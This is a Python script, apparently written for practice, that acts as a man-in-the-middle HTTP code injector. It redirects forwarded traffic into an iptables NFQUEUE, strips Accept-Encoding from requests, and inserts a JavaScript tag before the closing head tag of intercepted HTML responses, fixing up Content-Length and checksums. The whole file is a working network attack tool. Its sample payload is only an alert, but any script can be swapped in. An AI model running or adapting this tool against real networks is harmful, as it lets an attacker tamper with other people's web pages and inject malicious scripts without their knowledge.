#!/usr/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy
import re

tag_list = ["</HEAD>", "</head>"]

def create_queue():
    print(f"[+]Creating queue...!")
    subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
    # subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])
    print(f"[+]Queue created...!")

def queue():
    create_queue()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

def set_load(packet, load):
    packet[scapy.Raw].load = load
    bytes(packet)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    new_packet = packet.__class__(bytes(packet))
    return bytes(new_packet)

def decode_packet(packet):
    try:
        decoded_packet = packet[scapy.Raw].load.decode()
        return decoded_packet
    except UnicodeDecodeError:
        pass

def packet_to_scapy(packet):
    return scapy.IP(packet.get_payload())

def set_packet(packet,scapy_packet):
    return packet.set_payload(scapy_packet)


def Request_packet(packet):
    print("[+]Request Packet...!")
    modified_load = re.sub("Accept-Encoding:.*?\\r\\n","",decode_packet(packet))
    new_packet = set_load(packet, modified_load)
    return new_packet

def Response_packet(packet):
    print("[+]Response Packet...!")
    # injection_code = "<script>alert('text')</script>"
    injection_code = '<script>alert(1)</script>'
    load_decode = []
    load_decode = decode_packet(packet)
    if load_decode:
        content_length_search = re.search("(?:Content-Length:\s)(\d*)", load_decode)
        if content_length_search and "text/html" in load_decode:
            content_length = content_length_search.group(1)
            print(content_length)
            new_content_length = int(content_length) + len(injection_code)
            load_decode = load_decode.replace(content_length, str(new_content_length))
            print(load_decode)
        # if "</script>" in load_decode:
        #     scapy_packet = inject_in_script_tag(load_decode, packet)    
        #     return scapy_packet
        if "</head>" in load_decode:
            scapy_packet_modified = inject_in_head_tag(load_decode, packet, injection_code)
            print(scapy_packet_modified)
            return scapy_packet_modified
        else:
            return bytes(packet)
    else:
        return bytes(packet)
        
# def inject_in_script_tag(load, packet):
#     print("Modifying...!")
#     modified_load = load.replace("</script>","alert('text');</script>")
#     new_packet = set_load(packet, modified_load)
#     print(f"Modified packet:\n{new_packet}")
#     return new_packet

def inject_in_head_tag(load, packet, injection_code):
    print("Modifying...!")
    modified_load = load.replace("</head>",injection_code+"</head>")
    new_packet = set_load(packet, modified_load)
    print(f"Modified packet:\n{new_packet}")
    return new_packet

def process_packet(packet):
    scapy_packet = packet_to_scapy(packet)
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):

        if scapy_packet[scapy.TCP].dport == 80:
            request_packet = Request_packet(scapy_packet)
            set_packet(packet, request_packet)

        elif scapy_packet[scapy.TCP].sport == 80:
            response_packet = Response_packet(scapy_packet)
            set_packet(packet, response_packet)

    packet.accept()

def restore():
    subprocess.call(["iptables","--flush"])

def main(): 
    try:
        queue()
    except KeyboardInterrupt:
        print("\n[+]Detected CTRL + C ... Restoring IP Tables ... Please wait!")
        restore()
        print("Quiting!")

if __name__ == "__main__":
    main()
